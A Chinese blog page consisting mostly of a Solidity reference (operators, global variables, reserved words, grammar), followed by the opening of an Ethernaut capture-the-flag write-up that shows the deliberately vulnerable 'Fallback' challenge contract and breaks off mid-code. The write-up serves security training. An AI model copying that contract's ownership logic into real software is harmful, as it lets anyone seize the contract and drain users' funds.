<td style="text-align:left">12</td>
<td style="text-align:center">逻辑与</td>
<td style="text-align:left"><code>&amp;&amp;</code></td>
</tr>
<tr>
<td style="text-align:left">13</td>
<td style="text-align:center">逻辑或</td>
<td style="text-align:left">`</td>
<td></td>
<td>`</td>
</tr>
<tr>
<td style="text-align:left">14</td>
<td style="text-align:center">三元操作符</td>
<td style="text-align:left"><code>&lt;conditional&gt; ? &lt;if-true&gt; : &lt;if-false&gt;</code></td>
</tr>
<tr>
<td style="text-align:left">15</td>
<td style="text-align:center">赋值操作符</td>
<td style="text-align:left">`=,</td>
<td>=, ^=,&amp;=, &lt;&lt;=, &gt;&gt;=, +=, -=, *=, /=, %=`</td>
</tr>
<tr>
<td style="text-align:left">16</td>
<td style="text-align:center">逗号</td>
<td style="text-align:left"><code>,</code></td>
</tr>
</tbody>
</table>
<ul>
<li>全局变量(Global Variables)  </li>
</ul>
<ul>
<li><code>abi.encode(...) returns (bytes)</code>： ABI - 对给定参数进行编码</li>
<li><code>abi.encodePacked(...) returns (bytes)</code>：对给定参数执行 紧打包编码</li>
<li><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>： ABI - 对给定参数进行编码，并以给定的函数选择器作为起始的 4 字节数据一起返回</li>
<li><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>：等价于 <code>abi.encodeWithSelector(bytes4(keccak256(signature), ...)</code></li>
<li><code>block.blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希——仅可用于最新的 256 个区块且不包括当前区块；而 blocks 从 0.4.22 版本开始已经不推荐使用，由 <code>blockhash(uint blockNumber)</code>代替</li>
<li><code>block.coinbase （address）</code>：挖出当前区块的矿工的地址</li>
<li><code>lock.difficulty （uint）</code>：当前区块的难度值</li>
<li><code>block.gaslimit （uint）</code>：当前区块的 gas 上限</li>
<li><code>block.number （uint）</code>：当前区块的区块号</li>
<li><code>block.timestamp （uint）</code>：当前区块的时间戳</li>
<li><code>gasleft() returns (uint256)</code>：剩余的 gas</li>
<li><code>msg.data （bytes）</code>：完整的 calldata</li>
<li><code>msg.gas （uint）</code>：剩余的 gas - 自 0.4.21 版本开始已经不推荐使用，由 gesleft() 代替</li>
<li><code>msg.sender （address）</code>：消息发送方（当前调用）</li>
<li><code>msg.value （uint）</code>：随消息发送的 wei 的数量</li>
<li><code>now （uint）</code>：当前区块的时间戳（等价于 block.timestamp）</li>
<li><code>tx.gasprice (uint)</code>：交易的 gas price</li>
<li><code>tx.origin （address）</code>：交易发送方（完整调用链上的原始发送方）</li>
<li><code>assert(bool condition)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做内部错误）</li>
<li><code>require(bool condition)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误）</li>
<li><code>require(bool condition, string message)</code>：如果条件值为 false 则中止执行并回退所有状态变更（用做异常输入或外部组件错误），可以同时提供错误消息</li>
<li><code>revert()</code>：中止执行并回复所有状态变更</li>
<li><code>revert(string message)</code>：中止执行并回复所有状态变更，可以同时提供错误消息</li>
<li><code>blockhash(uint blockNumber) returns (bytes32)</code>：指定区块的区块哈希——仅可用于最新的 256 个区块</li>
<li><code>keccak256(...) returns (bytes32)</code>：计算 紧打包编码 的 Ethereum-SHA-3（Keccak-256）哈希</li>
<li><code>sha3(...) returns (bytes32)</code>：等价于 keccak256</li>
<li><code>sha256(...) returns (bytes32)</code>：计算 紧打包编码 的 SHA-256 哈希</li>
<li><code>ripemd160(...) returns (bytes20)</code>：计算 紧打包编码 的 RIPEMD-160 哈希</li>
<li><code>ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address)</code>：基于椭圆曲线签名找回与指定公钥关联的地址，发生错误的时候返回 0</li>
<li><code>addmod(uint x, uint y, uint k) returns (uint)</code>：计算 (x + y) % k 的值，其中加法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 <code>assert(k != 0);</code>作为参数检查，译者注）。</li>
<li><code>mulmod(uint x, uint y, uint k) returns (uint)</code>：计算 (x * y) % k 的值，其中乘法的结果即使超过 2**256 也不会被截取。从 0.5.0 版本开始会加入对 k != 0 的 assert（即会在此函数开头执行 <code>assert(k != 0);</code>作为参数检查，译者注）。</li>
<li><code>this</code>（类型为当前合约的变量）：当前合约实例，可以准确地转换为 address</li>
<li><code>super</code>：当前合约的上一级继承关系的合约</li>
<li><code>selfdestruct(address recipient)</code>：销毁当前合约，把余额发送到给定地址</li>
<li><code>suicide(address recipient)</code>：与 selfdestruct 等价，但已不推荐使用</li>
<li><code>&lt;address&gt;.balance （uint256）</code>： 地址类型 的余额，以 Wei 为单位</li>
<li><code>&lt;address&gt;.send(uint256 amount) returns (bool)</code>：向 地址类型 发送给定数量的 Wei，失败时返回 false</li>
<li><code>&lt;address&gt;.transfer(uint256 amount)</code>：向 地址类型 发送给定数量的 Wei，失败时会把错误抛出（throw）  </li>
</ul>
<blockquote>
<p>不要用 block.timestamp、now 或者 blockhash 作为随机种子，除非你明确知道你在做什么。  </p>
<p>时间戳和区块哈希都可以在一定程度上被矿工所影响。如果你用哈希值作为随机种子，那么例如挖矿团体中的坏人就可以使用给定的哈希来执行一个赌场功能，如果他们没赢钱，他们可以简单地换一个哈希再试。  </p>
<p>当前区块的时间戳必须比前一个区块的时间戳大，但唯一可以确定的就是它会是权威链（主链或者主分支）上两个连续区块时间戳之间的一个数值。</p>
</blockquote>
<blockquote>
<p>出于扩展性的原因，你无法取得所有区块的哈希。只有最新的 256 个区块的哈希可以拿到，其他的都将为 0。</p>
</blockquote>
<ul>
<li>保留字(Reserved Keywords)  </li>
</ul>
<p>以下是 Solidity 的保留字，未来可能会变为语法的一部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abstract, after, alias, apply, auto, case, catch, copyof, default, define, final, immutable, implements, in, inline, let, macro, match, mutable, null, of, override, partial, promise, reference, relocatable, sealed, sizeof, static, supports, switch, try, type, typedef, typeof, unchecked.</span><br></pre></td></tr></table></figure>
<ul>
<li>语法表(Language Grammar)  </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">SourceUnit = (PragmaDirective | ImportDirective | ContractDefinition)*</span><br><span class="line"></span><br><span class="line">// Pragma actually parses anything up to the trailing &apos;;&apos; to be fully forward-compatible.</span><br><span class="line">PragmaDirective = &apos;pragma&apos; Identifier ([^;]+) &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ImportDirective = &apos;import&apos; StringLiteral (&apos;as&apos; Identifier)? &apos;;&apos;</span><br><span class="line">        | &apos;import&apos; (&apos;*&apos; | Identifier) (&apos;as&apos; Identifier)? &apos;from&apos; StringLiteral &apos;;&apos;</span><br><span class="line">        | &apos;import&apos; &apos;&#123;&apos; Identifier (&apos;as&apos; Identifier)? ( &apos;,&apos; Identifier (&apos;as&apos; Identifier)? )* &apos;&#125;&apos; &apos;from&apos; StringLiteral &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ContractDefinition = ( &apos;contract&apos; | &apos;library&apos; | &apos;interface&apos; ) Identifier</span><br><span class="line">                     ( &apos;is&apos; InheritanceSpecifier (&apos;,&apos; InheritanceSpecifier )* )?</span><br><span class="line">                     &apos;&#123;&apos; ContractPart* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ContractPart = StateVariableDeclaration | UsingForDeclaration</span><br><span class="line">             | StructDefinition | ModifierDefinition | FunctionDefinition | EventDefinition | EnumDefinition</span><br><span class="line"></span><br><span class="line">InheritanceSpecifier = UserDefinedTypeName ( &apos;(&apos; Expression ( &apos;,&apos; Expression )* &apos;)&apos; )?</span><br><span class="line"></span><br><span class="line">StateVariableDeclaration = TypeName ( &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; | &apos;constant&apos; )* Identifier (&apos;=&apos; Expression)? &apos;;&apos;</span><br><span class="line">UsingForDeclaration = &apos;using&apos; Identifier &apos;for&apos; (&apos;*&apos; | TypeName) &apos;;&apos;</span><br><span class="line">StructDefinition = &apos;struct&apos; Identifier &apos;&#123;&apos;</span><br><span class="line">                     ( VariableDeclaration &apos;;&apos; (VariableDeclaration &apos;;&apos;)* ) &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ModifierDefinition = &apos;modifier&apos; Identifier ParameterList? Block</span><br><span class="line">ModifierInvocation = Identifier ( &apos;(&apos; ExpressionList? &apos;)&apos; )?</span><br><span class="line"></span><br><span class="line">FunctionDefinition = &apos;function&apos; Identifier? ParameterList</span><br><span class="line">                     ( ModifierInvocation | StateMutability | &apos;external&apos; | &apos;public&apos; | &apos;internal&apos; | &apos;private&apos; )*</span><br><span class="line">                     ( &apos;returns&apos; ParameterList )? ( &apos;;&apos; | Block )</span><br><span class="line">EventDefinition = &apos;event&apos; Identifier EventParameterList &apos;anonymous&apos;? &apos;;&apos;</span><br><span class="line"></span><br><span class="line">EnumValue = Identifier</span><br><span class="line">EnumDefinition = &apos;enum&apos; Identifier &apos;&#123;&apos; EnumValue? (&apos;,&apos; EnumValue)* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">ParameterList = &apos;(&apos; ( Parameter (&apos;,&apos; Parameter)* )? &apos;)&apos;</span><br><span class="line">Parameter = TypeName StorageLocation? Identifier?</span><br><span class="line"></span><br><span class="line">EventParameterList = &apos;(&apos; ( EventParameter (&apos;,&apos; EventParameter )* )? &apos;)&apos;</span><br><span class="line">EventParameter = TypeName &apos;indexed&apos;? Identifier?</span><br><span class="line"></span><br><span class="line">FunctionTypeParameterList = &apos;(&apos; ( FunctionTypeParameter (&apos;,&apos; FunctionTypeParameter )* )? &apos;)&apos;</span><br><span class="line">FunctionTypeParameter = TypeName StorageLocation?</span><br><span class="line"></span><br><span class="line">// semantic restriction: mappings and structs (recursively) containing mappings</span><br><span class="line">// are not allowed in argument lists</span><br><span class="line">VariableDeclaration = TypeName StorageLocation? Identifier</span><br><span class="line"></span><br><span class="line">TypeName = ElementaryTypeName</span><br><span class="line">         | UserDefinedTypeName</span><br><span class="line">         | Mapping</span><br><span class="line">         | ArrayTypeName</span><br><span class="line">         | FunctionTypeName</span><br><span class="line">         | ( &apos;address&apos; &apos;payable&apos; )</span><br><span class="line"></span><br><span class="line">UserDefinedTypeName = Identifier ( &apos;.&apos; Identifier )*</span><br><span class="line"></span><br><span class="line">Mapping = &apos;mapping&apos; &apos;(&apos; ElementaryTypeName &apos;=&gt;&apos; TypeName &apos;)&apos;</span><br><span class="line">ArrayTypeName = TypeName &apos;[&apos; Expression? &apos;]&apos;</span><br><span class="line">FunctionTypeName = &apos;function&apos; FunctionTypeParameterList ( &apos;internal&apos; | &apos;external&apos; | StateMutability )*</span><br><span class="line">                   ( &apos;returns&apos; FunctionTypeParameterList )?</span><br><span class="line">StorageLocation = &apos;memory&apos; | &apos;storage&apos; | &apos;calldata&apos;</span><br><span class="line">StateMutability = &apos;pure&apos; | &apos;view&apos; | &apos;payable&apos;</span><br><span class="line"></span><br><span class="line">Block = &apos;&#123;&apos; Statement* &apos;&#125;&apos;</span><br><span class="line">Statement = IfStatement | WhileStatement | ForStatement | Block | InlineAssemblyStatement |</span><br><span class="line">            ( DoWhileStatement | PlaceholderStatement | Continue | Break | Return |</span><br><span class="line">              Throw | EmitStatement | SimpleStatement ) &apos;;&apos;</span><br><span class="line"></span><br><span class="line">ExpressionStatement = Expression</span><br><span class="line">IfStatement = &apos;if&apos; &apos;(&apos; Expression &apos;)&apos; Statement ( &apos;else&apos; Statement )?</span><br><span class="line">WhileStatement = &apos;while&apos; &apos;(&apos; Expression &apos;)&apos; Statement</span><br><span class="line">PlaceholderStatement = &apos;_&apos;</span><br><span class="line">SimpleStatement = VariableDefinition | ExpressionStatement</span><br><span class="line">ForStatement = &apos;for&apos; &apos;(&apos; (SimpleStatement)? &apos;;&apos; (Expression)? &apos;;&apos; (ExpressionStatement)? &apos;)&apos; Statement</span><br><span class="line">InlineAssemblyStatement = &apos;assembly&apos; StringLiteral? AssemblyBlock</span><br><span class="line">DoWhileStatement = &apos;do&apos; Statement &apos;while&apos; &apos;(&apos; Expression &apos;)&apos;</span><br><span class="line">Continue = &apos;continue&apos;</span><br><span class="line">Break = &apos;break&apos;</span><br><span class="line">Return = &apos;return&apos; Expression?</span><br><span class="line">Throw = &apos;throw&apos;</span><br><span class="line">EmitStatement = &apos;emit&apos; FunctionCall</span><br><span class="line">VariableDefinition = (VariableDeclaration | &apos;(&apos; VariableDeclaration? (&apos;,&apos; VariableDeclaration? )* &apos;)&apos; ) ( &apos;=&apos; Expression )?</span><br><span class="line"></span><br><span class="line">// Precedence by order (see github.com/ethereum/solidity/pull/732)</span><br><span class="line">Expression</span><br><span class="line">  = Expression (&apos;++&apos; | &apos;--&apos;)</span><br><span class="line">  | NewExpression</span><br><span class="line">  | IndexAccess</span><br><span class="line">  | MemberAccess</span><br><span class="line">  | FunctionCall</span><br><span class="line">  | &apos;(&apos; Expression &apos;)&apos;</span><br><span class="line">  | (&apos;!&apos; | &apos;~&apos; | &apos;delete&apos; | &apos;++&apos; | &apos;--&apos; | &apos;+&apos; | &apos;-&apos;) Expression</span><br><span class="line">  | Expression &apos;**&apos; Expression</span><br><span class="line">  | Expression (&apos;*&apos; | &apos;/&apos; | &apos;%&apos;) Expression</span><br><span class="line">  | Expression (&apos;+&apos; | &apos;-&apos;) Expression</span><br><span class="line">  | Expression (&apos;&lt;&lt;&apos; | &apos;&gt;&gt;&apos;) Expression</span><br><span class="line">  | Expression &apos;&amp;&apos; Expression</span><br><span class="line">  | Expression &apos;^&apos; Expression</span><br><span class="line">  | Expression &apos;|&apos; Expression</span><br><span class="line">  | Expression (&apos;&lt;&apos; | &apos;&gt;&apos; | &apos;&lt;=&apos; | &apos;&gt;=&apos;) Expression</span><br><span class="line">  | Expression (&apos;==&apos; | &apos;!=&apos;) Expression</span><br><span class="line">  | Expression &apos;&amp;&amp;&apos; Expression</span><br><span class="line">  | Expression &apos;||&apos; Expression</span><br><span class="line">  | Expression &apos;?&apos; Expression &apos;:&apos; Expression</span><br><span class="line">  | Expression (&apos;=&apos; | &apos;|=&apos; | &apos;^=&apos; | &apos;&amp;=&apos; | &apos;&lt;&lt;=&apos; | &apos;&gt;&gt;=&apos; | &apos;+=&apos; | &apos;-=&apos; | &apos;*=&apos; | &apos;/=&apos; | &apos;%=&apos;) Expression</span><br><span class="line">  | PrimaryExpression</span><br><span class="line"></span><br><span class="line">PrimaryExpression = BooleanLiteral</span><br><span class="line">                  | NumberLiteral</span><br><span class="line">                  | HexLiteral</span><br><span class="line">                  | StringLiteral</span><br><span class="line">                  | TupleExpression</span><br><span class="line">                  | Identifier</span><br><span class="line">                  | ElementaryTypeNameExpression</span><br><span class="line"></span><br><span class="line">ExpressionList = Expression ( &apos;,&apos; Expression )*</span><br><span class="line">NameValueList = Identifier &apos;:&apos; Expression ( &apos;,&apos; Identifier &apos;:&apos; Expression )*</span><br><span class="line"></span><br><span class="line">FunctionCall = Expression &apos;(&apos; FunctionCallArguments &apos;)&apos;</span><br><span class="line">FunctionCallArguments = &apos;&#123;&apos; NameValueList? &apos;&#125;&apos;</span><br><span class="line">                      | ExpressionList?</span><br><span class="line"></span><br><span class="line">NewExpression = &apos;new&apos; TypeName</span><br><span class="line">MemberAccess = Expression &apos;.&apos; Identifier</span><br><span class="line">IndexAccess = Expression &apos;[&apos; Expression? &apos;]&apos;</span><br><span class="line"></span><br><span class="line">BooleanLiteral = &apos;true&apos; | &apos;false&apos;</span><br><span class="line">NumberLiteral = ( HexNumber | DecimalNumber ) (&apos; &apos; NumberUnit)?</span><br><span class="line">NumberUnit = &apos;wei&apos; | &apos;szabo&apos; | &apos;finney&apos; | &apos;ether&apos;</span><br><span class="line">           | &apos;seconds&apos; | &apos;minutes&apos; | &apos;hours&apos; | &apos;days&apos; | &apos;weeks&apos; | &apos;years&apos;</span><br><span class="line">HexLiteral = &apos;hex&apos; (&apos;&quot;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;&quot;&apos; | &apos;\&apos;&apos; ([0-9a-fA-F]&#123;2&#125;)* &apos;\&apos;&apos;)</span><br><span class="line">StringLiteral = &apos;&quot;&apos; ([^&quot;\r\n\\] | &apos;\\&apos; .)* &apos;&quot;&apos;</span><br><span class="line">Identifier = [a-zA-Z_$] [a-zA-Z_$0-9]*</span><br><span class="line"></span><br><span class="line">HexNumber = &apos;0x&apos; [0-9a-fA-F]+</span><br><span class="line">DecimalNumber = [0-9]+ ( &apos;.&apos; [0-9]* )? ( [eE] [0-9]+ )?</span><br><span class="line"></span><br><span class="line">TupleExpression = &apos;(&apos; ( Expression? ( &apos;,&apos; Expression? )*  )? &apos;)&apos;</span><br><span class="line">                | &apos;[&apos; ( Expression  ( &apos;,&apos; Expression  )*  )? &apos;]&apos;</span><br><span class="line"></span><br><span class="line">ElementaryTypeNameExpression = ElementaryTypeName</span><br><span class="line"></span><br><span class="line">ElementaryTypeName = &apos;address&apos; | &apos;bool&apos; | &apos;string&apos; | Int | Uint | Byte | Fixed | Ufixed</span><br><span class="line"></span><br><span class="line">Int = &apos;int&apos; | &apos;int8&apos; | &apos;int16&apos; | &apos;int24&apos; | &apos;int32&apos; | &apos;int40&apos; | &apos;int48&apos; | &apos;int56&apos; | &apos;int64&apos; | &apos;int72&apos; | &apos;int80&apos; | &apos;int88&apos; | &apos;int96&apos; | &apos;int104&apos; | &apos;int112&apos; | &apos;int120&apos; | &apos;int128&apos; | &apos;int136&apos; | &apos;int144&apos; | &apos;int152&apos; | &apos;int160&apos; | &apos;int168&apos; | &apos;int176&apos; | &apos;int184&apos; | &apos;int192&apos; | &apos;int200&apos; | &apos;int208&apos; | &apos;int216&apos; | &apos;int224&apos; | &apos;int232&apos; | &apos;int240&apos; | &apos;int248&apos; | &apos;int256&apos;</span><br><span class="line"></span><br><span class="line">Uint = &apos;uint&apos; | &apos;uint8&apos; | &apos;uint16&apos; | &apos;uint24&apos; | &apos;uint32&apos; | &apos;uint40&apos; | &apos;uint48&apos; | &apos;uint56&apos; | &apos;uint64&apos; | &apos;uint72&apos; | &apos;uint80&apos; | &apos;uint88&apos; | &apos;uint96&apos; | &apos;uint104&apos; | &apos;uint112&apos; | &apos;uint120&apos; | &apos;uint128&apos; | &apos;uint136&apos; | &apos;uint144&apos; | &apos;uint152&apos; | &apos;uint160&apos; | &apos;uint168&apos; | &apos;uint176&apos; | &apos;uint184&apos; | &apos;uint192&apos; | &apos;uint200&apos; | &apos;uint208&apos; | &apos;uint216&apos; | &apos;uint224&apos; | &apos;uint232&apos; | &apos;uint240&apos; | &apos;uint248&apos; | &apos;uint256&apos;</span><br><span class="line"></span><br><span class="line">Byte = &apos;byte&apos; | &apos;bytes&apos; | &apos;bytes1&apos; | &apos;bytes2&apos; | &apos;bytes3&apos; | &apos;bytes4&apos; | &apos;bytes5&apos; | &apos;bytes6&apos; | &apos;bytes7&apos; | &apos;bytes8&apos; | &apos;bytes9&apos; | &apos;bytes10&apos; | &apos;bytes11&apos; | &apos;bytes12&apos; | &apos;bytes13&apos; | &apos;bytes14&apos; | &apos;bytes15&apos; | &apos;bytes16&apos; | &apos;bytes17&apos; | &apos;bytes18&apos; | &apos;bytes19&apos; | &apos;bytes20&apos; | &apos;bytes21&apos; | &apos;bytes22&apos; | &apos;bytes23&apos; | &apos;bytes24&apos; | &apos;bytes25&apos; | &apos;bytes26&apos; | &apos;bytes27&apos; | &apos;bytes28&apos; | &apos;bytes29&apos; | &apos;bytes30&apos; | &apos;bytes31&apos; | &apos;bytes32&apos;</span><br><span class="line"></span><br><span class="line">Fixed = &apos;fixed&apos; | ( &apos;fixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )</span><br><span class="line"></span><br><span class="line">Ufixed = &apos;ufixed&apos; | ( &apos;ufixed&apos; [0-9]+ &apos;x&apos; [0-9]+ )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AssemblyBlock = &apos;&#123;&apos; AssemblyStatement* &apos;&#125;&apos;</span><br><span class="line"></span><br><span class="line">AssemblyStatement = AssemblyBlock</span><br><span class="line">                  | AssemblyFunctionDefinition</span><br><span class="line">                  | AssemblyVariableDeclaration</span><br><span class="line">                  | AssemblyAssignment</span><br><span class="line">                  | AssemblyIf</span><br><span class="line">                  | AssemblyExpression</span><br><span class="line">                  | AssemblySwitch</span><br><span class="line">                  | AssemblyForLoop</span><br><span class="line">                  | AssemblyBreakContinue</span><br><span class="line">AssemblyFunctionDefinition =</span><br><span class="line">    &apos;function&apos; Identifier &apos;(&apos; AssemblyIdentifierList? &apos;)&apos;</span><br><span class="line">    ( &apos;-&gt;&apos; AssemblyIdentifierList )? AssemblyBlock</span><br><span class="line">AssemblyVariableDeclaration = &apos;let&apos; AssemblyIdentifierList ( &apos;:=&apos; AssemblyExpression )?</span><br><span class="line">AssemblyAssignment = AssemblyIdentifierList &apos;:=&apos; AssemblyExpression</span><br><span class="line">AssemblyExpression = AssemblyFunctionCall | Identifier | Literal</span><br><span class="line">AssemblyIf = &apos;if&apos; AssemblyExpression AssemblyBlock</span><br><span class="line">AssemblySwitch = &apos;switch&apos; AssemblyExpression ( Case+ AssemblyDefault? | AssemblyDefault )</span><br><span class="line">AssemblyCase = &apos;case&apos; Literal AssemblyBlock</span><br><span class="line">AssemblyDefault = &apos;default&apos; AssemblyBlock</span><br><span class="line">AssemblyForLoop = &apos;for&apos; AssemblyBlock AssemblyExpression AssemblyBlock AssemblyBlock</span><br><span class="line">AssemblyBreakContinue = &apos;break&apos; | &apos;continue&apos;</span><br><span class="line">AssemblyFunctionCall = Identifier &apos;(&apos; ( AssemblyExpression ( &apos;,&apos; AssemblyExpression )* )? &apos;)&apos;</span><br><span class="line"></span><br><span class="line">AssemblyIdentifierList = Identifier ( &apos;,&apos; Identifier )*</span><br></pre></td></tr></table></figure>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-26</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/26/Ethernaut-writeUp/">Ethernaut WriteUp</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="很好玩的合约游戏"><a href="#很好玩的合约游戏" class="headerlink" title="很好玩的合约游戏"></a>很好玩的合约游戏</h3><hr>
<h4 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h4><blockquote>
<p><strong>Target</strong>: claim ownership of the contract  </p>
</blockquote>
<p>&emsp;&emsp;这道题是考察<strong>fallback</strong>函数的奇妙(sb)用法，他的目的应该是处理异常用的，但是效果其实有点鸡肋…</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Fallback</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contributions[msg.sender] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getContribution</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">onlyOwner</span> </span>&#123;</span><br><span class="line">    owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.value &gt; <span class="number">0</span> &amp;&amp; 